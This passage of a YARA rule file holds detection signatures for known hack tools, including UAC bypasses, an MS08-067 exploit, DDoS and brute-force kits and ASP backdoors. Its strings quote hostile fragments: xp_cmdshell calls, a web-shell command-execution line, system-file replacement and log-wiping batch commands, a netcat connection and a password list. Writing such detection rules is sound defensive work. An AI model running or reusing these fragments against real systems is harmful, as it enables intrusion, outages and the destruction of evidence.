      $s0 = "Insecure.Org" fullword wide
      $s1 = "Copyright (c) Insecure.Com" fullword wide
      $s2 = "nmap" fullword nocase
      $s3 = "Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm)." ascii
   condition:
      all of them
}

rule iKAT_startbar {
   meta:
      description = "Tool to hide unhide the windows startbar from command line - iKAT hack tools - file startbar.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "05.11.14"
      score = 50
      reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
      hash = "0cac59b80b5427a8780168e1b85c540efffaf74f"
      id = "f29f15e9-aa29-519a-b4ad-c018aac68fd6"
   strings:
      $s2 = "Shinysoft Limited1" fullword ascii
      $s3 = "Shinysoft Limited0" fullword ascii
      $s4 = "Wellington1" fullword ascii
      $s6 = "Wainuiomata1" fullword ascii
      $s8 = "56 Wright St1" fullword ascii
      $s9 = "UTN-USERFirst-Object" fullword ascii
      $s10 = "New Zealand1" fullword ascii
   condition:
      all of them
}

rule iKAT_Tool_Generic {
   meta:
      description = "Generic Rule for hack tool iKAT files gpdisable.exe, kitrap0d.exe, uacpoc.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "05.11.14"
      score = 55
      reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
      super_rule = 1
      hash0 = "814c126f21bc5e993499f0c4e15b280bf7c1c77f"
      hash1 = "75f5aed1e719443a710b70f2004f34b2fe30f2a9"
      hash2 = "b65a460d015fd94830d55e8eeaf6222321e12349"
      id = "a8064a26-09c0-59f1-bdf9-628a445014ff"
   strings:
      $s0 = "<IconFile>C:\\WINDOWS\\App.ico</IconFile>" fullword
      $s1 = "Failed to read the entire file" fullword
      $s4 = "<VersionCreatedBy>14.4.0</VersionCreatedBy>" fullword
      $s8 = "<ProgressCaption>Run &quot;executor.bat&quot; once the shell has spawned.</P"
      $s9 = "Running Zip pipeline..." fullword
      $s10 = "<FinTitle />" fullword
      $s12 = "<AutoTemp>0</AutoTemp>" fullword
      $s14 = "<DefaultDir>%TEMP%</DefaultDir>" fullword
      $s15 = "AES Encrypting..." fullword
      $s20 = "<UnzipDir>%TEMP%</UnzipDir>" fullword
   condition:
      all of them
}

rule BypassUac2 {
   meta:
      description = "Auto-generated rule - file BypassUac2.zip"
      author = "yarGen Yara Rule Generator"
      hash = "ef3e7dd2d1384ecec1a37254303959a43695df61"
      id = "8b7e49de-9b0a-5dc4-86af-1a854dc649cc"
   strings:
      $s0 = "/BypassUac/BypassUac/BypassUac_Utils.cpp" fullword ascii
      $s1 = "/BypassUac/BypassUacDll/BypassUacDll.aps" fullword ascii
      $s3 = "/BypassUac/BypassUac/BypassUac.ico" fullword ascii
   condition:
      all of them
}

rule BypassUac_3 {
   meta:
      description = "Auto-generated rule - file BypassUacDll.dll"
      author = "yarGen Yara Rule Generator"
      hash = "1974aacd0ed987119999735cad8413031115ce35"
      id = "407a8e12-1160-584d-94c8-7aa78e29c754"
   strings:
      $s0 = "BypassUacDLL.dll" fullword wide
      $s1 = "\\Release\\BypassUacDll" ascii
      $s3 = "Win7ElevateDLL" fullword wide
      $s7 = "BypassUacDLL" fullword wide
   condition:
      3 of them
}

rule BypassUac_9 {
   meta:
      description = "Auto-generated rule - file BypassUac.zip"
      author = "yarGen Yara Rule Generator"
      hash = "93c2375b2e4f75fc780553600fbdfd3cb344e69d"
      id = "a5751d7d-d135-51bc-8351-40374a2d57bf"
   strings:
      $s0 = "/x86/BypassUac.exe" fullword ascii
      $s1 = "/x64/BypassUac.exe" fullword ascii
      $s2 = "/x86/BypassUacDll.dll" fullword ascii
      $s3 = "/x64/BypassUacDll.dll" fullword ascii
      $s15 = "BypassUac" fullword ascii
   condition:
      all of them
}

rule BypassUacDll_6 {
   meta:
      description = "Auto-generated rule - file BypassUacDll.aps"
      author = "yarGen Yara Rule Generator"
      hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
      id = "5be27053-446f-5ea3-a242-2661aeffa3df"
   strings:
      $s3 = "BypassUacDLL.dll" fullword wide
      $s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii
   condition:
      all of them
}

rule BypassUac_EXE {
   meta:
      description = "Auto-generated rule - file BypassUacDll.aps"
      author = "yarGen Yara Rule Generator"
      hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
      id = "b88aded5-7dfb-5cdf-bb42-cd8b069259e0"
   strings:
      $s1 = "Wole32.dll" wide
      $s3 = "System32\\migwiz" wide
      $s4 = "System32\\migwiz\\CRYPTBASE.dll" wide
      $s5 = "Elevation:Administrator!new:" wide
      $s6 = "BypassUac" wide
   condition:
      all of them
}

rule APT_Proxy_Malware_Packed_dev
{
   meta:
      author = "FRoth"
      date = "2014-11-10"
      description = "APT Malware - Proxy"
      hash = "6b6a86ceeab64a6cb273debfa82aec58"
      score = 50
      id = "0b81b6c9-86fa-59c1-b58c-80310f6c0680"
   strings:
      $string0 = "PECompact2" fullword
      $string1 = "[LordPE]"
      $string2 = "steam_ker.dll"
   condition:
      all of them
}

rule Tzddos_DDoS_Tool_CN {
   meta:
      description = "Disclosed hacktool set - file tzddos"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "d4c517eda5458247edae59309453e0ae7d812f8e"
      id = "bf2bfc7b-4db8-5d35-a312-2530a42985d5"
   strings:
      $s0 = "for /f %%a in (host.txt) do (" ascii
      $s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
      $s2 = "del host.txt /q" fullword ascii
      $s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
      $s4 = "start Http.exe %%a %http%" fullword ascii
      $s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
      $s6 = "del Result.txt s2.txt s1.txt " fullword ascii
   condition:
      all of them
}

rule Ncat_Hacktools_CN {
   meta:
      description = "Disclosed hacktool set - file nc.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "001c0c01c96fa56216159f83f6f298755366e528"
      id = "bdbfaf75-f8c0-508e-b6b1-9ddea179a325"
   strings:
      $s0 = "nc -l -p port [options] [hostname] [port]" fullword ascii
      $s2 = "nc [-options] hostname port[s] [ports] ... " fullword ascii
      $s3 = "gethostpoop fuxored" fullword ascii
      $s6 = "VERNOTSUPPORTED" fullword ascii
      $s7 = "%s [%s] %d (%s)" fullword ascii
      $s12 = " `--%s' doesn't allow an argument" fullword ascii
   condition:
      all of them
}

rule MS08_067_Exploit_Hacktools_CN {
   meta:
      description = "Disclosed hacktool set - file cs.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "a3e9e0655447494253a1a60dbc763d9661181322"
      id = "c15836c7-e739-5cc0-9d41-d651ea3e4738"
   strings:
      $s0 = "MS08-067 Exploit for CN by EMM@ph4nt0m.org" fullword ascii
      $s3 = "Make SMB Connection error:%d" fullword ascii
      $s5 = "Send Payload Over!" fullword ascii
      $s7 = "Maybe Patched!" fullword ascii
      $s8 = "RpcExceptionCode() = %u" fullword ascii
      $s11 = "ph4nt0m" fullword wide
      $s12 = "\\\\%s\\IPC" ascii
   condition:
      4 of them
}

rule Hacktools_CN_Burst_sql {
   meta:
      description = "Disclosed hacktool set - file sql.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "d5139b865e99b7a276af7ae11b14096adb928245"
      id = "77ea95fc-7a6a-522b-8a72-1832598c4d2d"
   strings:
      $s0 = "s.exe %s %s %s %s %d /save" fullword ascii
      $s2 = "s.exe start error...%d" fullword ascii
      $s4 = "EXEC sp_addextendedproc xp_cmdshell,'xplog70.dll'" fullword ascii
      $s7 = "EXEC master..xp_cmdshell 'wscript.exe cc.js'" fullword ascii
      $s10 = "Result.txt" fullword ascii
      $s11 = "Usage:sql.exe [options]" fullword ascii
      $s17 = "%s root %s %d error" fullword ascii
      $s18 = "Pass.txt" fullword ascii
      $s20 = "SELECT sillyr_at_gmail_dot_com INTO DUMPFILE '%s\\\\sillyr_x.so' FROM sillyr_x" fullword ascii
   condition:
      6 of them
}

rule Hacktools_CN_Panda_445TOOL {
   meta:
      description = "Disclosed hacktool set - file 445TOOL.rar"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "92050ba43029f914696289598cf3b18e34457a11"
      id = "02075631-49cc-5b97-ad8e-92d734a26d34"
   strings:
      $s0 = "scan.bat" fullword ascii
      $s1 = "Http.exe" fullword ascii
      $s2 = "GOGOGO.bat" fullword ascii
      $s3 = "ip.txt" fullword ascii
   condition:
      all of them
}

rule Hacktools_CN_Panda_445 {
   meta:
      description = "Disclosed hacktool set - file 445.rar"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "a61316578bcbde66f39d88e7fc113c134b5b966b"
      id = "02075631-49cc-5b97-ad8e-92d734a26d34"
   strings:
      $s0 = "for /f %%i in (ips.txt) do (start cmd.bat %%i)" fullword ascii
      $s1 = "445\\nc.exe" fullword ascii
      $s2 = "445\\s.exe" fullword ascii
      $s3 = "cs.exe %1" fullword ascii
      $s4 = "445\\cs.exe" fullword ascii
      $s5 = "445\\ip.txt" fullword ascii
      $s6 = "445\\cmd.bat" fullword ascii
      $s9 = "@echo off" fullword ascii
   condition:
      all of them
}

rule Hacktools_CN_WinEggDrop {
   meta:
      description = "Disclosed hacktool set - file s.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "7665011742ce01f57e8dc0a85d35ec556035145d"
      id = "9b6244ee-5ace-5caa-bfa2-732bcfcfc998"
   strings:
      $s0 = "Normal Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
      $s2 = "SYN Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
      $s6 = "Example: %s TCP 12.12.12.12 12.12.12.254 21 512 /Banner" fullword ascii
      $s8 = "Something Wrong About The Ports" fullword ascii
      $s9 = "Performing Time: %d/%d/%d %d:%d:%d --> " fullword ascii
      $s10 = "Example: %s TCP 12.12.12.12/24 80 512 /T8 /Save" fullword ascii
      $s12 = "%u Ports Scanned.Taking %d Threads " fullword ascii
      $s13 = "%-16s %-5d -> \"%s\"" fullword ascii
      $s14 = "SYN Scan Can Only Perform On WIN 2K Or Above" fullword ascii
      $s17 = "SYN Scan: About To Scan %s:%d Using %d Thread" fullword ascii
      $s18 = "Scan %s Complete In %d Hours %d Minutes %d Seconds. Found %u Open Ports" fullword ascii
   condition:
      5 of them
}

rule Hacktools_CN_Scan_BAT {
   meta:
      description = "Disclosed hacktool set - file scan.bat"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "6517d7c245f1300e42f7354b0fe5d9666e5ce52a"
      id = "836e0618-93c7-5519-bbc4-705ff5c2e127"
   strings:
      $s0 = "for /f %%a in (host.txt) do (" ascii
      $s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
      $s2 = "del host.txt /q" fullword ascii
      $s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
      $s4 = "start Http.exe %%a %http%" fullword ascii
      $s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
   condition:
      5 of them
}

rule Hacktools_CN_Panda_Burst {
   meta:
      description = "Disclosed hacktool set - file Burst.rar"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "ce8e3d95f89fb887d284015ff2953dbdb1f16776"
      id = "e07c66d1-958e-5ad2-9d5b-380d48af8360"
   strings:
      $s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http://60.15.124.106:63389/tasksvr." ascii
   condition:
      all of them
}

rule Hacktools_CN_445_cmd {
   meta:
      description = "Disclosed hacktool set - file cmd.bat"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "69b105a3aec3234819868c1a913772c40c6b727a"
      id = "b9693f51-26ac-5bf1-8c4d-ca852a154636"
   strings:
      $bat = "@echo off" fullword ascii
      $s0 = "cs.exe %1" fullword ascii
      $s2 = "nc %1 4444" fullword ascii
   condition:
      uint32(0) == 0x68636540 and $bat at 0 and all of ($s*)
}

rule Hacktools_CN_GOGOGO_Bat {
   meta:
      description = "Disclosed hacktool set - file GOGOGO.bat"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "4bd4f5b070acf7fe70460d7eefb3623366074bbd"
      id = "b52cc150-81d4-5895-8f83-ee2006f75617"
   strings:
      $s0 = "for /f \"delims=\" %%x in (endend.txt) do call :lisoob %%x" fullword ascii
      $s1 = "http://www.tzddos.com/ -------------------------------------------->byebye.txt" fullword ascii
      $s2 = "ren %systemroot%\\system32\\drivers\\tcpip.sys tcpip.sys.bak" fullword ascii
      $s4 = "IF /I \"%wangle%\"==\"\" ( goto start ) else ( goto erromm )" fullword ascii
      $s5 = "copy *.tzddos scan.bat&del *.tzddos" fullword ascii
      $s6 = "del /f tcpip.sys" fullword ascii
      $s9 = "if /i \"%CB%\"==\"www.tzddos.com\" ( goto mmbat ) else ( goto wangle )" fullword ascii
      $s10 = "call scan.bat" fullword ascii
      $s12 = "IF /I \"%erromm%\"==\"\" ( goto start ) else ( goto zuihoujh )" fullword ascii
      $s13 = "IF /I \"%zuihoujh%\"==\"\" ( goto start ) else ( goto laji )" fullword ascii
      $s18 = "sc config LmHosts start= auto" fullword ascii
      $s19 = "copy tcpip.sys %systemroot%\\system32\\drivers\\tcpip.sys > nul" fullword ascii
      $s20 = "ren %systemroot%\\system32\\dllcache\\tcpip.sys tcpip.sys.bak" fullword ascii
   condition:
      3 of them
}

rule Hacktools_CN_Burst_pass {
   meta:
      description = "Disclosed hacktool set - file pass.txt"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "55a05cf93dbd274355d798534be471dff26803f9"
      id = "d8f6784f-80c8-51e2-9d86-40022cd8705d"
   strings:
      $s0 = "123456.com" fullword ascii
      $s1 = "123123.com" fullword ascii
      $s2 = "360.com" fullword ascii
      $s3 = "123.com" fullword ascii
      $s4 = "juso.com" fullword ascii
      $s5 = "sina.com" fullword ascii
      $s7 = "changeme" fullword ascii
      $s8 = "master" fullword ascii
      $s9 = "google.com" fullword ascii
      $s10 = "chinanet" fullword ascii
      $s12 = "lionking" fullword ascii
   condition:
      all of them
}

rule Hacktools_CN_JoHor_Posts_Killer {
   meta:
      description = "Disclosed hacktool set - file JoHor_Posts_Killer.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "d157f9a76f9d72dba020887d7b861a05f2e56b6a"
      id = "68bba78e-f3a0-5eaa-9c63-e5f23a76b328"
   strings:
      $s0 = "Multithreading Posts_Send Killer" fullword ascii
      $s3 = "GET [Access Point] HTTP/1.1" fullword ascii
      $s6 = "The program's need files was not exist!" fullword ascii
      $s7 = "JoHor_Posts_Killer" fullword wide
      $s8 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" fullword ascii
      $s10 = "  ( /s ) :" fullword ascii
      $s11 = "forms.vbp" fullword ascii
      $s12 = "forms.vcp" fullword ascii
      $s13 = "Software\\FlySky\\E\\Install" fullword ascii
   condition:
      5 of them
}

rule Hacktools_CN_Panda_tesksd {
   meta:
      description = "Disclosed hacktool set - file tesksd.jpg"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "922147b3e1e6cf1f5dd5f64a4e34d28bdc9128cb"
      id = "399ff307-c2e8-57bb-b792-a2c599e8686e"
   strings:
      $s0 = "name=\"Microsoft.Windows.Common-Controls\" " fullword ascii
      $s1 = "ExeMiniDownload.exe" fullword wide
      $s16 = "POST %Hs" fullword ascii
   condition:
      all of them
}

rule Hacktools_CN_Http {
   meta:
      description = "Disclosed hacktool set - file Http.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "788bf0fdb2f15e0c628da7056b4e7b1a66340338"
      id = "bbff6ff6-8cef-5a83-afd3-34f306e8e715"
   strings:
      $s0 = "RPCRT4.DLL" fullword ascii
      $s1 = "WNetAddConnection2A" fullword ascii
      $s2 = "NdrPointerBufferSize" fullword ascii
      $s3 = "_controlfp" fullword ascii
   condition:
      all of them and filesize < 10KB
}

rule Hacktools_CN_Burst_Start {
   meta:
      description = "Disclosed hacktool set - file Start.bat - DoS tool"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "2014-11-17"
      modified = "2023-01-27"
      score = 60
      hash = "75d194d53ccc37a68286d246f2a84af6b070e30c"
      id = "1291fbc5-fbb3-5425-bb9a-e45f4d7cf562"
   strings:
      $s0 = "for /f \"eol= tokens=1,2 delims= \" %%i in (ip.txt) do (" ascii
      $s1 = "Blast.bat /r 600" fullword ascii
      $s2 = "Blast.bat /l Blast.bat" fullword ascii
      $s3 = "Blast.bat /c 600" fullword ascii
      $s4 = "start Clear.bat" fullword ascii
      $s5 = "del Result.txt" fullword ascii
      $s6 = "s syn %%i %%j 3306 /save" fullword ascii
      $s7 = "start Thecard.bat" fullword ascii
      $s10 = "setlocal enabledelayedexpansion" fullword ascii
   condition:
      5 of them
}

rule Hacktools_CN_Panda_tasksvr {
   meta:
      description = "Disclosed hacktool set - file tasksvr.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "a73fc74086c8bb583b1e3dcfd326e7a383007dc0"
      id = "5c85b382-551a-5e9e-9af8-d106cbe26f74"
   strings:
      $s2 = "Consys21.dll" fullword ascii
      $s4 = "360EntCall.exe" fullword wide
      $s15 = "Beijing1" fullword ascii
   condition:
      all of them
}
rule Hacktools_CN_Burst_Clear {
   meta:
      description = "Disclosed hacktool set - file Clear.bat"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "148c574a4e6e661aeadaf3a4c9eafa92a00b68e4"
      id = "21f33a36-779e-5eac-819c-ef79f291b43c"
   strings:
      $s0 = "del /f /s /q %systemdrive%\\*.log    " fullword ascii
      $s1 = "del /f /s /q %windir%\\*.bak    " fullword ascii
      $s4 = "del /f /s /q %systemdrive%\\*.chk    " fullword ascii
      $s5 = "del /f /s /q %systemdrive%\\*.tmp    " fullword ascii
      $s8 = "del /f /q %userprofile%\\COOKIES s\\*.*    " fullword ascii
      $s9 = "rd /s /q %windir%\\temp & md %windir%\\temp    " fullword ascii
      $s11 = "del /f /s /q %systemdrive%\\recycled\\*.*    " fullword ascii
      $s12 = "del /f /s /q \"%userprofile%\\Local Settings\\Temp\\*.*\"    " fullword ascii
      $s19 = "del /f /s /q \"%userprofile%\\Local Settings\\Temporary Internet Files\\*.*\"   " ascii
   condition:
      5 of them
}

rule Hacktools_CN_Burst_Thecard {
   meta:
      description = "Disclosed hacktool set - file Thecard.bat"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "50b01ea0bfa5ded855b19b024d39a3d632bacb4c"
      id = "a9946aeb-2042-522f-8d91-f8b96341bb64"
   strings:
      $s0 = "tasklist |find \"Clear.bat\"||start Clear.bat" fullword ascii
      $s1 = "Http://www.coffeewl.com" fullword ascii
      $s2 = "ping -n 2 localhost 1>nul 2>nul" fullword ascii
      $s3 = "for /L %%a in (" ascii
      $s4 = "MODE con: COLS=42 lines=5" fullword ascii
   condition:
      all of them
}

rule Hacktools_CN_Burst_Blast {
   meta:
      description = "Disclosed hacktool set - file Blast.bat"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "17.11.14"
      score = 60
      hash = "b07702a381fa2eaee40b96ae2443918209674051"
      id = "9ac723c4-e88d-5fb3-b18f-c8b764c8acf3"
   strings:
      $s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http:" ascii
      $s1 = "@echo off" fullword ascii
   condition:
      all of them
}

rule VUBrute_VUBrute {
   meta:
      description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file VUBrute.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "22.11.14"
      score = 70
      hash = "166fa8c5a0ebb216c832ab61bf8872da556576a7"
      id = "7ac74c85-465c-5eb5-8e91-004f28cabb75"
   strings:
      $s0 = "Text Files (*.txt);;All Files (*)" fullword ascii
      $s1 = "http://ubrute.com" fullword ascii
      $s11 = "IP - %d; Password - %d; Combination - %d" fullword ascii
      $s14 = "error.txt" fullword ascii
   condition:
      all of them
}

rule DK_Brute {
   meta:
      description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file DK Brute.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "22.11.14"
      score = 70
      reference = "http://goo.gl/xiIphp"
      hash = "93b7c3a01c41baecfbe42461cb455265f33fbc3d"
      id = "c9ea0dcf-10f3-5161-aebc-2db04c24b0a5"
   strings:
      $s6 = "get_CrackedCredentials" fullword ascii
      $s13 = "Same port used for two different protocols:" fullword wide
      $s18 = "coded by fLaSh" fullword ascii
      $s19 = "get_grbToolsScaningCracking" fullword ascii
   condition:
      all of them
}

rule VUBrute_config {
   meta:
      description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file config.ini"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "22.11.14"
      score = 70
      reference = "http://goo.gl/xiIphp"
      hash = "b9f66b9265d2370dab887604921167c11f7d93e9"
      id = "25cad108-b2d6-5886-bb2f-e614e05649fa"
   strings:
      $s2 = "Restore=1" fullword ascii
      $s6 = "Thread=" ascii
      $s7 = "Running=1" fullword ascii
      $s8 = "CheckCombination=" fullword ascii
      $s10 = "AutoSave=1.000000" fullword ascii
      $s12 = "TryConnect=" ascii
      $s13 = "Tray=" ascii
   condition:
      all of them
}

rule sig_238_hunt {
   meta:
      description = "Disclosed hacktool set (old stuff) - file hunt.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "f9f059380d95c7f8d26152b1cb361d93492077ca"
      id = "5d9d1f99-2f12-51e9-a554-b349e19d00fb"
   strings:
      $s1 = "Programming by JD Glaser - All Rights Reserved" fullword ascii
      $s3 = "Usage - hunt \\\\servername" fullword ascii
      $s4 = ".share = %S - %S" fullword wide
      $s5 = "SMB share enumerator and admin finder " fullword ascii
      $s7 = "Hunt only runs on Windows NT..." fullword ascii
      $s8 = "User = %S" fullword ascii
      $s9 = "Admin is %s\\%s" fullword ascii
   condition:
      all of them
}

rule sig_238_listip {
   meta:
      description = "Disclosed hacktool set (old stuff) - file listip.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "f32a0c5bf787c10eb494eb3b83d0c7a035e7172b"
      id = "417faf20-ee07-5c3e-bfcf-89599e38e62e"
   strings:
      $s0 = "ERROR!!! Bad host lookup. Program Terminate." fullword ascii
      $s2 = "ERROR No.2!!! Program Terminate." fullword ascii
      $s4 = "Local Host Name: %s" fullword ascii
      $s5 = "Packed by exe32pack 1.38" fullword ascii
      $s7 = "Local Computer Name: %s" fullword ascii
      $s8 = "Local IP Adress: %s" fullword ascii
   condition:
      all of them
}

rule ArtTrayHookDll {
   meta:
      description = "Disclosed hacktool set (old stuff) - file ArtTrayHookDll.dll"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "4867214a3d96095d14aa8575f0adbb81a9381e6c"
      id = "324561fc-024c-5583-aa25-6b13e9616898"
   strings:
      $s0 = "ArtTrayHookDll.dll" fullword ascii
      $s7 = "?TerminateHook@@YAXXZ" fullword ascii
   condition:
      all of them
}

rule sig_238_eee {
   meta:
      description = "Disclosed hacktool set (old stuff) - file eee.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "236916ce2980c359ff1d5001af6dacb99227d9cb"
      id = "9d3ad3a9-0498-5ca3-ac19-f250cb10c4d3"
   strings:
      $s0 = "szj1230@yesky.com" fullword wide
      $s3 = "C:\\Program Files\\DevStudio\\VB\\VB5.OLB" fullword ascii
      $s4 = "MailTo:szj1230@yesky.com" fullword wide
      $s5 = "Command1_Click" fullword ascii
      $s7 = "software\\microsoft\\internet explorer\\typedurls" fullword wide
      $s11 = "vb5chs.dll" fullword ascii
      $s12 = "MSVBVM50.DLL" fullword ascii
   condition:
      all of them
}

rule aspbackdoor_asp4 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file asp4.txt"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "faf991664fd82a8755feb65334e5130f791baa8c"
      id = "7718aa71-fc0f-505c-a035-b78ae0438653"
   strings:
      $s0 = "system.dll" fullword ascii
      $s2 = "set sys=server.CreateObject (\"system.contral\") " fullword ascii
      $s3 = "Public Function reboot(atype As Variant)" fullword ascii
      $s4 = "t& = ExitWindowsEx(1, atype)" ascii
      $s5 = "atype=request(\"atype\") " fullword ascii
      $s7 = "AceiveX dll" fullword ascii
      $s8 = "Declare Function ExitWindowsEx Lib \"user32\" (ByVal uFlags As Long, ByVal " ascii
      $s10 = "sys.reboot(atype)" fullword ascii
   condition:
      all of them
}

rule aspfile1 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file aspfile1.asp"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "77b1e3a6e8f67bd6d16b7ace73dca383725ac0af"
      id = "1b66dec0-22c8-5937-a0b2-22cbc68241ef"
   strings:
      $s0 = "' -- check for a command that we have posted -- '" fullword ascii
      $s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
      $s5 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><BODY>" fullword ascii
      $s6 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
      $s8 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
      $s15 = "szCMD = Request.Form(\".CMD\")" fullword ascii
   condition:
      3 of them
}

rule EditServer {
   meta:
      description = "Disclosed hacktool set (old stuff) - file EditServer.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "87b29c9121cac6ae780237f7e04ee3bc1a9777d3"
      id = "de6bf995-1c7c-561f-98df-e8748d5fb157"
   strings:
      $s0 = "%s Server.exe" fullword ascii
      $s1 = "Service Port: %s" fullword ascii
      $s2 = "The Port Must Been >0 & <65535" fullword ascii
      $s8 = "3--Set Server Port" fullword ascii
      $s9 = "The Server Password Exceeds 32 Characters" fullword ascii
      $s13 = "Service Name: %s" fullword ascii
      $s14 = "Server Password: %s" fullword ascii
      $s17 = "Inject Process Name: %s" fullword ascii

